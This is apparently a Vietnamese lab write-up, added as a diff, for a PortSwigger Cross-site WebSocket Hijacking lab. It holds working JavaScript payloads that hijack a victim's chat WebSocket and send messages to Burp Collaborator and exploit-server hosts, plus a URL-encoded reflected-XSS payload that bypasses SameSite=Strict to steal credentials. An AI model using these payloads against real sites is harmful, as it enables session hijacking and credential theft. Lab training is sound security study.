@@ -447,3 +447,154 @@ thêm nữa, khi thử gửi req GET thay đổi email, trình duyệt vẫn cho
 
 Lab des: 
 
+Tấn công Cross-site WebSocket Hijacking (CSWSH) vào tính năng Live chat để:
+
+- Lấy lịch sử chat của nạn nhân (chứa tài khoản đăng nhập).
+- Gửi thông tin đó về Burp Collaborator.
+- Đăng nhập vào tài khoản của nạn nhân bằng thông tin vừa đánh cắp.
+
+Tính năng Live chat trong bài lab: 
+
+![image-20250603154415943](./image/image-20250603154415943.png)
+
+=> không có unpredictable param
+
+GET /chat gọi đến một script trung gian: chat.js
+
+![image-20250603164448283](./image/image-20250603164448283.png)
+
+
+
+![image-20250603164622941](./image/image-20250603164622941.png)
+
+=> xuất hiện 1 url
+
+Khi bấm refresh lại trang live chat, browser gửi một message `ready` đến server, và load lại toàn bộ cuộc trò chuyện
+
+![image-20250603164953371](./image/image-20250603164953371.png)
+
+- Craft payload: 
+
+  ```
+  <script>
+      var ws = new WebSocket('wss://0a2b00c503b978c680d012d500b500d2.web-security-academy.net/chat');
+      ws.onopen = function() {
+          ws.send("READY");
+      };
+      ws.onmessage = function(event) {
+          fetch('https://o7w4pdhcum3s2gebmcgp4bnj3a91xwll.oastify.com.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+      };
+  </script>
+  ```
+
+  
+
+=> view exploit: http req và res: bắt đầu một cuộc nói chuyện mới
+
+![image-20250603170356740](./image/image-20250603170356740.png)
+
+Xem request GET /chat, ta thấy khi payload trên gọi trực tiếp url /chat:
+
+![image-20250603170534086](./image/image-20250603170534086.png)
+
+=> session không được gửi cùng req GET /chat
+
+![image-20250603170612158](./image/image-20250603170612158.png)
+
+=> Do SameSite=Strict => session k ddwuocj gửi kèm req, không lấy được chat history.
+
+Tuy nhiên, để ý trong phần response của `GET /resources/js/chat.js HTTP/2` có một URL.
+
+Truy cập vào URL mới xuất hiện ở trên - có thể là sibling domain: 
+
+```js
+Access-Control-Allow-Origin: https://cms-0a2b00c503b978c680d012d500b500d2.web-security-academy.net
+```
+
+![image-20250603170852685](./image/image-20250603170852685.png)
+
+![image-20250603170956222](./image/image-20250603170956222.png)
+
+Nhập bừa một tài khoản và thấy `username` được reflect trong message `Invalid username`
+
+Thử chèn xss payload đơn giản test xem sao: `<script>alert(1)</script>`
+
+![image-20250603171143512](./image/image-20250603171143512.png)
+
+=> it works 
+
+![image-20250603171240634](./image/image-20250603171240634.png)
+
+Chuyển req thành GET và có kết quả tương tự:
+
+![image-20250603171401271](./image/image-20250603171401271.png)
+
+copy url và mở trên browser cũng có kết quả tương tự:
+
+![image-20250603171654684](./image/image-20250603171654684.png)
+
+=> tận dụng lỗ hổng xss này để chèn vào đoạn mã in ra chat history của victim. 
+
+(Do server sử dụng samesite strict, nên nếu payload exploit gọi trực tiếp url /chat, thì server sẽ không gửi kèm session của victim, nhưng nếu url /chat được gọi thông qua việc khai thác lỗ hổng xss của trang cms-... (thực thi đoạn mã js bất kì) thì session lại được gửi kèm, giống như người dùng tự truy cập url => khi đó ta sẽ thấy ddwuocj chat history của victim)
+
+- Bypass samesite restrictions: 
+
+  ```
+  <script>
+      var ws = new WebSocket('wss://0ade001903f880e5a4c8b4e100d500ce.web-security-academy.net/chat');
+      ws.onopen = function() {
+          ws.send("READY");
+      };
+      ws.onmessage = function(event) {
+          fetch('https://kth0b938gipooc07882lq79fp6vxjx7m.oastify.com.oastify.com.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
+      };
+  </script>
+  ```
+
+  Hoặc có thể sử dụng exploit server để nhận message luôn: 
+
+  ```
+  <script>
+      var ws = new WebSocket('wss://0ade001903f880e5a4c8b4e100d500ce.web-security-academy.net/chat');
+      ws.onopen = function() {
+          ws.send("READY");
+      };
+      ws.onmessage = function(event) {
+          fetch("https://exploit-0aa200c703ec80eea475b3550148001b.exploit-server.net/exploit?message="+ btoa(message));
+      };
+  </script>
+  ```
+
+  url encode cả script trên:
+
+  ```
+  %3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%64%65%30%30%31%39%30%33%66%38%38%30%65%35%61%34%63%38%62%34%65%31%30%30%64%35%30%30%63%65%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%33%68%6c%6a%7a%73%72%72%34%31%64%37%63%76%6f%71%77%72%71%34%65%71%78%79%64%70%6a%67%37%66%76%34%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e
+  ```
+
+  Craft final payload:
+
+```
+<script>
+    document.location = "https://cms-0ade001903f880e5a4c8b4e100d500ce.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%64%65%30%30%31%39%30%33%66%38%38%30%65%35%61%34%63%38%62%34%65%31%30%30%64%35%30%30%63%65%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%33%68%6c%6a%7a%73%72%72%34%31%64%37%63%76%6f%71%77%72%71%34%65%71%78%79%64%70%6a%67%37%66%76%34%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=123456";
+</script>
+```
+
+![image-20250603221754074](./image/image-20250603221754074.png)
+
+Nếu dùng exploit server nhận message, đoạn mã chèn vào sẽ như trong hình:
+
+![image-20250603221829880](./image/image-20250603221829880.png)
+
+deliver the exploit to the victim, quan sát các tương tác HTTP với collaborator, hoặc nếu sử dụng exploit server thì xem access log và decode base64, trong chat history sẽ có creds của user cần lấy.
+
+![image-20250603172356239](./image/image-20250603172356239.png)
+
+
+
+### [Lab 9: SameSite Lax bypass via cookie refresh](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh)
+
+Lab des: 
+
+
+
+Steps: 
